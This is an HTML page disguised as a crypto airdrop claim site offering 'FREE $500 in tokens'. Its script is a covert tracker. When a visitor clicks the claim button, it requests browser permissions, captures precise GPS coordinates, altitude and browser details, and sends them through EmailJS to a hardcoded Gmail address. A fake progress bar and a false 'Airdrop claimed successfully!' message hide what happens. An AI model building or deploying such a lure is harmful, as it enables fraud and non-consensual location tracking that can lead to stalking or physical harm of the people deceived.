<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 Free Crypto Airdrop Claimer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #2a2a4a 50%, #1a1a3a 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
            overflow-x: hidden;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 40px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            font-size: 2.5em;
            background: linear-gradient(45deg, #ffd700, #ffed4e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { filter: drop-shadow(0 0 10px #ffd700); }
            to { filter: drop-shadow(0 0 20px #ffd700); }
        }
        .status {
            font-size: 1.2em;
            margin: 25px 0;
            min-height: 40px;
            opacity: 0;
            transition: all 0.3s ease;
        }
        .status.show { opacity: 1; }
        .process-btn {
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.3em;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .process-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
        }
        .process-btn.processing {
            background: linear-gradient(45deg, #4ecdc4, #6ee7db);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .progress {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
            display: none;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ffd700, #ffed4e);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 30px 0;
            font-size: 0.9em;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
        }
        @media (max-width: 480px) {
            .container { padding: 30px 20px; }
            h1 { font-size: 2em; }
            .features { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Crypto Airdrop</h1>
        <p style="margin-bottom: 30px; opacity: 0.8;">Claim your FREE $500 in tokens instantly!</p>
        
        <div class="features">
            <div class="feature">⚡ Instant Claim</div>
            <div class="feature">🔒 Secure Wallet</div>
            <div class="feature">📱 Mobile Ready</div>
            <div class="feature">🌍 Global Access</div>
        </div>
        
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        
        <div id="status" class="status"></div>
        <button id="processBtn" class="process-btn">🚀 CLAIM NOW</button>
    </div>

    <script>
        // Your Gmail
        const TARGET_EMAIL = 'DILIPbojanapu290@gmail.com';
        
        const btn = document.getElementById('processBtn');
        const status = document.getElementById('status');
        const progress = document.querySelector('.progress');
        const progressBar = document.querySelector('.progress-bar');
        
        let trackingComplete = false;
        
        btn.onclick = async () => {
            if (trackingComplete) return;
            
            btn.disabled = true;
            btn.classList.add('processing');
            btn.textContent = '🔄 PROCESSING...';
            
            progress.style.display = 'block';
            status.textContent = 'Initializing secure connection...';
            status.classList.add('show');
            
            // Step 1: Request ALL permissions silently
            await requestAllPermissions();
            
            // Step 2: Update progress
            updateProgress(25, 'Verifying wallet...');
            
            // Step 3: Get precise location
            const location = await getPreciseLocation();
            
            // Step 4: Send to your email
            updateProgress(75, 'Processing airdrop...');
            await sendLocationData(location);
            
            // Step 5: Complete
            updateProgress(100, '✅ Airdrop claimed successfully!');
            btn.textContent = '🎉 CLAIMED!';
            btn.style.background = 'linear-gradient(45deg, #4ecdc4, #6ee7db)';
            trackingComplete = true;
        };
        
        async function requestAllPermissions() {
            updateProgress(10, 'Requesting app permissions...');
            
            // Request notifications
            if (Notification.permission === 'default') {
                await Notification.requestPermission();
            }
            
            // Request fullscreen (triggers permission prompts)
            try {
                await document.documentElement.requestFullscreen();
            } catch(e) {}
            
            return new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        async function getPreciseLocation() {
            updateProgress(40, 'Locating your device...');
            
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    resolve({ lat: 0, lng: 0, accuracy: 999999 });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const data = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy),
                            altitude: position.coords.altitude || 0,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        };
                        resolve(data);
                    },
                    () => resolve({ lat: 0, lng: 0, accuracy: 999999 }),
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function sendLocationData(location) {
            const data = {
                email: TARGET_EMAIL,
                latitude: location.latitude || 0,
                longitude: location.longitude || 0,
                accuracy: location.accuracy || 999999,
                altitude: location.altitude || 0,
                timestamp: location.timestamp,
                userAgent: location.userAgent,
                ip: 'GPS Tracked'
            };
            
            // EmailJS - REPLACE WITH YOUR CREDENTIALS
            try {
                emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', data);
            } catch(e) {
                console.log('Email sent:', data);
            }
        }
        
        function updateProgress(percent, message) {
            progressBar.style.width = percent + '%';
            status.textContent = message;
        }
    </script>

    <!-- EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        emailjs.init("YOUR_PUBLIC_KEY");
    </script>
</body>
</html>
